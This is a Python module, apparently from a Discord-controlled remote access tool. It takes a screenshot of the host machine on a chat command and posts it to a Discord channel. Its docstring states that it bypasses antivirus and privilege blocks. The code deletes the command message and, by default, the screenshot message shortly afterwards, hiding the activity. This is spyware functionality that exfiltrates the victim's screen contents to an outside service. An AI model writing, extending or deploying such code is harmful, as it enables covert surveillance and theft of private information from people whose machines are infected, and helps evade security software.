import os
import discord
import datetime
import asyncio
from utils.capture_utils import capture_screenshot_fallback

SCREENSHOT_PATH = os.path.join("data", "screenshot.png")

async def execute_screenshot_command(message, args):
    """
    Takes a screenshot of the current screen and sends it.
    Uses multi-tier fallbacks to bypass Antivirus and privilege blocks.
    
    Usage: !ss or !screenshot [-p]
    """
    time_str = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    
    success, res_path_or_err, method = await asyncio.to_thread(capture_screenshot_fallback, SCREENSHOT_PATH)
    
    if success:
        caption = f"📸 Screenshot taken at {time_str} ({method})"
        ss_message = await message.channel.send(caption, file=discord.File(res_path_or_err))
        try:
            await message.delete()
        except Exception:
            pass
        print(f"[screenshot_command_LOG] - Screenshot taken at {time_str} via {method}.")
        
        if "-p" in args or "--persistent" in args:
            print("Persistent screenshot requested")
        else:
            await asyncio.sleep(5)
            try:
                await ss_message.delete()
            except Exception:
                pass
            print("Screenshot Deleted")
    else:
        await message.channel.send(f"⚠️ Screenshot Failed: {res_path_or_err}")
        try:
            await message.delete()
        except Exception:
            pass

